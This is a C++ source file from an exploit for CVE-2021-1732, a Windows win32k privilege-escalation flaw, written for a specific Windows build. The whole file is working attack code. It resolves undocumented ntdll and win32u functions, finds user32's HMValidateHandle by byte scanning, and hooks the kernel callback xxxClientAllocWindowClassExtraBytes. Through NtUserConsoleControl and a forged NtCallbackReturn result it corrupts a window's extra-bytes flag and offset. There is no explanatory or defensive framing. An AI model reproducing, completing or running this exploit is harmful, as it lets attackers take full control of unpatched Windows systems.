#include "def.hpp"
namespace offset = exploit::gadget::X_17763_737;
namespace CVE_2021_1732
{
    bool initAPI() {
        auto ntdll = GetModuleHandleA("ntdll.dll");
        auto win32u = GetModuleHandleA("win32u.dll");
        if (!ntdll || !win32u) {
            std::cerr << "[!] cant load lib: ntdll.dll or win32u\n";
            return false;
        }
        NtUserConsoleControl = (FNtUserConsoleControl)GetProcAddress(win32u, "NtUserConsoleControl");
        NtCallbackReturn = (FNtCallbackReturn)GetProcAddress(ntdll, "NtCallbackReturn");
        RtlAllocateHeap = (FRtlAllocateHeap)GetProcAddress(ntdll, "RtlAllocateHeap");
        FindHMValidateHandle(&HMValidateHandle);
        if (!NtUserConsoleControl
            || !NtCallbackReturn
            || !HMValidateHandle
            || !RtlAllocateHeap) {
            std::cerr << "[!] cant load functions\n";
            return false;
        }
        return true;
    }

    bool FindHMValidateHandle(FHMValidateHandle* pfOutHMValidateHandle) {
        *pfOutHMValidateHandle = nullptr;
        HMODULE hUser32 = GetModuleHandle(L"user32.dll");
        PBYTE pMenuFunc = (PBYTE)GetProcAddress(hUser32, "IsMenu");    // user32!IsMenu
        if (pMenuFunc) {
            for (int i = 0; i < 0x100; ++i) {
                if (0xe8 == *pMenuFunc++) {
                    DWORD ulOffset = *(PINT)pMenuFunc;
                    *pfOutHMValidateHandle = (FHMValidateHandle)(pMenuFunc + 5 + (ulOffset & 0xffff) - 0x10000 - ((ulOffset >> 16 ^ 0xffff) * 0x10000));    // 计算得到 user32!HMValidateHandle 地址
                    break;
                }
            }
        }
        return *pfOutHMValidateHandle != nullptr ? true : false;
    }
    LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
    {
        return ::DefWindowProcW(hWnd, msg, wParam, lParam);
    }

    NTSTATUS MyxxxClientAllocWindowClassExtraBytes(unsigned int* pSize) {
        // printf("[+] Called MyxxxClientAllocWindowClassExtraBytes, want extra: 0x%p=0x%x\n", pSize, *pSize);
        int i = 0;
        if (*pSize == magicExtra) {
            HWND hwndMagic = NULL;
            //search from freed NormalClass window mapping desktop heap
            for (i = 2; i < g_HWNDKs.size(); ++i) {
                ULONG_PTR cbWndExtra = *reinterpret_cast<ULONG_PTR*>(
                    (reinterpret_cast<ULONG_PTR>(g_HWNDKs[i]) + offset::tagWND::tagWNDK::cbWndExtra));
                printf("[*] Check: %x\n", cbWndExtra);
                if (magicExtra == cbWndExtra) {
                    hwndMagic = (HWND) * (ULONG_PTR*)(g_HWNDKs[i]);
                    break;
                }
            }
            if (!hwndMagic) {
                printf("[-] Not found hwndMagic, memory layout unsuccessfully :( \n");
                goto end;
            }
            printf("[+] Found hwndMagic: g_HWNDKs[%d], 0x%llX: 0x%X\n", i, g_HWNDKs[i], hwndMagic);
            printf("[+] Magic Window's extraFlag=0x%X\n", *reinterpret_cast<DWORD*>(
                (reinterpret_cast<ULONG_PTR>(g_HWNDKs[i]) + offset::tagWND::tagWNDK::dwExtraFlag)));
            CVE_2021_1732::choosenOne = hwndMagic;

            ULONG_PTR ConsoleCtrlInfo[2] = { 0 };
            ULONG_PTR hookResult[3] = { 0 };

            // 1. set hwndMagic extraFlag |= 0x800
            ULONG_PTR ChangeOffset = 0;
            ConsoleCtrlInfo[0] = (ULONG_PTR)hwndMagic; // 第一个参数需要为窗口句柄
            ConsoleCtrlInfo[1] = (ULONG_PTR)ChangeOffset;

            NTSTATUS ret = NtUserConsoleControl(6, reinterpret_cast<ULONG_PTR>(&ConsoleCtrlInfo), sizeof(ConsoleCtrlInfo));
            if (!NT_SUCCESS(ret)) {
                printf("[x] Call NtUserConsoleControl failed\n");
            }
            printf("[+] Magic Window's extraFlag=0x%X, cbWndExtra=0x%X\n",
                *reinterpret_cast<DWORD*>(
                    (reinterpret_cast<ULONG_PTR>(g_HWNDKs[i]) + offset::tagWND::tagWNDK::dwExtraFlag)),
                *reinterpret_cast<DWORD*>(
                    (reinterpret_cast<ULONG_PTR>(g_HWNDKs[i]) + offset::tagWND::tagWNDK::cbWndExtra))
            );

            // 2. set hwndMagic pExtraBytes fake offset
            struct {
                ULONG_PTR retvalue;
                ULONG_PTR unused1;
                ULONG_PTR unused2;
            } result = { 0 };
            result.retvalue = *reinterpret_cast<ULONG_PTR*>(
                (reinterpret_cast<ULONG_PTR>(g_HWNDKs[0]) + offset::tagWND::tagWNDK::KernelDesktopHeapBaseOffset));
            tag0_reverseBaseOffset = result.retvalue;
            tag1_reverseBaseOffset = *reinterpret_cast<ULONG_PTR*>(
                (reinterpret_cast<ULONG_PTR>(g_HWNDKs[1]) + offset::tagWND::tagWNDK::KernelDesktopHeapBaseOffset));
            tag2_reverseBaseOffset = *reinterpret_cast<ULONG_PTR*>( //need repair after exploit
                (reinterpret_cast<ULONG_PTR>(g_HWNDKs[i]) + offset::tagWND::tagWNDK::KernelDesktopHeapBaseOffset));
            return NtCallbackReturn(reinterpret_cast<DWORD64*>(&result), sizeof(result), 0);
        }
    end:
        return orign_xxxClientAllocWindowClassExtraBytes(pSize);
    }
} // namespace CVE_2021_1732